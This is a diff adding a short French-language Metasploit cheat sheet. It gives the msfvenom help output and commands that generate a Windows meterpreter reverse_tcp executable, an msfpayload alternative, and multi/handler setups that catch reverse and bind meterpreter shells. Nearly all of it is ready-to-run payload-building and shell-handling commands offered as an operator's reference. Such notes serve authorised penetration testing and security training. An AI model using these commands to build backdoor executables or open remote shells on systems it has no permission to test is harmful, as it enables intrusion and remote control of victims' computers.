@@ -1,0 +1,62 @@
+﻿#Metasploit#
+##Genration de payload executables##
+###Manuel###
+~~~~~~~
+# msfvenom -h
+Usage: /opt/framework/msf3/msfvenom [options] 
+
+Options:
+    -p, --payload    [payload]       Payload to use. Specify a '-' or stdin to use custom payloads
+    -l, --list       [module_type]   List a module type example: payloads, encoders, nops, all
+    -n, --nopsled    [length]        Prepend a nopsled of [length] size on to the payload
+    -f, --format     [format]        Format to output results in: raw, ruby, rb, perl, pl, bash, sh, c, js_be, js_le, java, dll, exe, exe-small, elf, macho, vba, vbs, loop-vbs, asp, war
+    -e, --encoder    [encoder]       The encoder to use
+    -a, --arch       [architecture]  The architecture to use
+        --platform   [platform]      The platform of the payload
+    -s, --space      [length]        The maximum size of the resulting payload
+    -b, --bad-chars  [list]          The list of characters to avoid example: '\x00\xff'
+    -i, --iterations [count]         The number of times to encode the payload
+    -c, --add-code   [path]          Specify an additional win32 shellcode file to include
+    -x, --template   [path]          Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -h, --help                       Show this message
+~~~~~~~
+
+###Exemple###
+####Lister les options d'un payload####
+~~~~~~~
+# msfvenom -p windows/meterpreter/reverse_tcp -o
+~~~~~~~
+
+####Créer un payload meterpreter pour windows####
+~~~~~~~
+# msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$(ifdata -pa eth0) LPORT=5555 > windobReverseMeterpreter5555.exe
+~~~~~~~
+
+###Alternative###
+~~~~~~~
+# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.1 X > met-reverse.exe
+~~~~~~~
+
+##Lancement de handler##
+~~~~~~~
+# msfcli multi/handler LPORT=5555 E
+
+
+use payload/linux/x86/meterpreter/bind_tcp
+
+use payload/windows/meterpreter/bind_tcp
+set LPORT 8888
+show options
+generate -t exe -f /root/meterpreter6666.exe
+exploit
+
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.0.1
+set LPORT 8888
+exploit
+~~~~~~~
+
+https://github.com/MrTchuss/Metasploit-stuff/tree/master/tools
